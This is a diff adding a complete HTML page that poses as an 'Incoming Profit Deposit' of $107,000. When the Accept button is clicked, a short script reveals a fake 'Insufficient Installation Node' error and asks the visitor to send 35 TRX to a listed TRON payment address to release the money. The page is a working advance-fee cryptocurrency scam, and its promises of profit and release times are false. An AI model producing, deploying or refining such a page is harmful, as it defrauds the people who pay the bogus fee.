@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Incoming Profit Deposit</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+      background: #0b0f14;
+      color: #eaf1f8;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #121820;
+      border: 1px solid #1b2430;
+      border-radius: 16px;
+      padding: 32px;
+      max-width: 480px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 16px;
+      color: #ffd36e;
+    }
+
+    .amount {
+      font-size: 18px;
+      margin-bottom: 12px;
+    }
+
+    .loader {
+      width: 80px;
+      height: 80px;
+      border: 8px solid rgba(255,255,255,0.1);
+      border-top: 8px solid #36a2ef;
+      border-radius: 50%;
+      margin: 24px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .btn {
+      appearance: none;
+      border: none;
+      background: linear-gradient(135deg, #329bff, #0057d6);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 8px 24px rgba(50,155,255,0.25);
+      margin-top: 20px;
+    }
+
+    .error {
+      display: none;
+      margin-top: 24px;
+      padding: 16px;
+      background: rgba(255,92,92,0.1);
+      border: 1px solid #ff5c5c;
+      border-radius: 12px;
+      color: #ff5c5c;
+    }
+
+    .battery {
+      margin: 16px auto;
+      width: 60px;
+      height: 28px;
+      border: 2px solid #ff5c5c;
+      border-radius: 6px;
+      position: relative;
+      background: #1b2430;
+    }
+
+    .battery::after {
+      content: "";
+      position: absolute;
+      top: 6px;
+      right: -10px;
+      width: 6px;
+      height: 16px;
+      background: #ff5c5c;
+      border-radius: 2px;
+    }
+
+    .battery-level {
+      width: 12%;
+      height: 100%;
+      background: #ff5c5c;
+    }
+
+    .wallets {
+      margin-top: 24px;
+      font-size: 14px;
+      text-align: left;
+    }
+
+    .wallets strong {
+      color: #ffd36e;
+    }
+
+    .note {
+      margin-top: 16px;
+      font-size: 13px;
+      color: #9fb3c8;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Incoming Profit Deposit</h1>
+    <div class="amount">Amount: <strong>$107,000</strong></div>
+    <div class="loader" id="loader"></div>
+    <button class="btn" id="acceptBtn">Accept</button>
+
+    <div class="error" id="errorBox">
+      ⚠️ Deposit Error: Insufficient Installation Node<br />
+      <div class="battery">
+        <div class="battery-level"></div>
+      </div>
+      <div style="margin-top: 12px;">
+        To confirm and release your $107,000 profit, please send <strong>35 TRX</strong> to the payment address below.
+      </div>
+    </div>
+
+    <div class="wallets" id="wallets" style="display:none;">
+      <div><strong>Receiving Address:</strong><br />TUAVAdUQ5R569CSD5jn3mbUtszXLn6ovM3</div>
+      <div style="margin-top: 12px;"><strong>Payment Address (35 TRX):</strong><br />TQ6TzjQ6mFmwU7cTKtkPgXTrDQrfJRWmTR</div>
+    </div>
+
+    <div class="note" id="note" style="display:none;">
+      Once the 35 TRX is confirmed, your $107,000 will be released to your wallet within 5–15 minutes (average TRON network processing time).
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('acceptBtn').addEventListener('click', () => {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('errorBox').style.display = 'block';
+      document.getElementById('wallets').style.display = 'block';
+      document.getElementById('note').style.display = 'block';
+    });
+  </script>
+</body>
+</html>
